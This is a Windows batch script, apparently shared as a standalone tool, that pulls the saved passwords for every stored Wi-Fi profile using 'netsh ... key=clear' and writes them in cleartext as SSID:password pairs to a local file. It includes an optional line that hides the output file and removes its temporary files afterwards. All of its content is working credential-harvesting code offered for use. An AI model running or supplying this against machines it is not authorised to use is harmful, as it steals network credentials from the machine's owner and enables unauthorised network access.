:: Author : TheFlash2k

:: Extracting Passwords from all the existing wifis:
@echo off

SETLOCAL EnableExtensions EnableDelayedExpansion

:: Setting the file names
set db="wifi.dat"

:: Creating empty file:
echo. 2> .\%db%

:: Hiding these files: (removing :: to hide the database file)
:: attrib +s +h %db%

:: Storing the WiFi names in the temp file:
(netsh wlan show profiles | findstr All) > %temp%\wifi.txt

set index=0
for /f "tokens=*" %%l in (%temp%\wifi.txt) do (
	for /f "tokens=1,2 delims=:" %%a in ("%%l") do (
		set ssid=%%b
		:: Removing the first space from the beginning: (The max length of the SSID could be 50)
		set ssid=!ssid:~1,50!
		rem echo !ssid! >> .\%ssid_file%
		(netsh wlan show profile name="!ssid!" key=clear | findstr Key) > %temp%\pass.txt
		for /f "tokens=1,2 delims=:" %%x in (%temp%\pass.txt) do (
			set pass=%%y
			:: Removing the trailing and preceding spaces to a limit of 100
			set pass=!pass:~1,100!
			:: Storing in SSID:PASSWORD format
			echo !ssid!:!pass! >> .\%db%
		)
	)
)

:: Deleting the temp files:
del %temp%\wifi.txt
del %temp%\pass.txt
